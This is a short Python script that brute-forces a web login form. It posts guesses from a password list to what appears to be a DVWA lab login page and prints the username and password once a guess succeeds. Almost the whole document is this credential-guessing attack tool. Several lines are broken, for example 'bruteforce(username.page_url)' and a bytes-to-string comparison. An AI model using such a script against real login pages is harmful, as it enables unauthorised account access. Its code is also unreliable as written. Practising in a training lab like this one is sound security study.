#!/usr/bin/python

import requests

def bruteforce(username,url):
    for password in passwords:
        password = password.strip("\n")
        print("[*] Trying to bruteforce with the password:" + password)
        data_dictionary = {"username":username,"password":password,"Login":"submit"}
        response = requests.post(url,data=data_dictionary)
        if "Login failed" in response.content:
            pass
        else:
            print("[*] Username: -->" +username)  
            print("[*] password: -->" +password) 
            exit() 

page_url = "http://192.168.1.5/dvwa/login.php"
username = input("[*] Enter username For Specified page: ")

with open("passwordlist.txt","r") as passwords:
    bruteforce(username.page_url)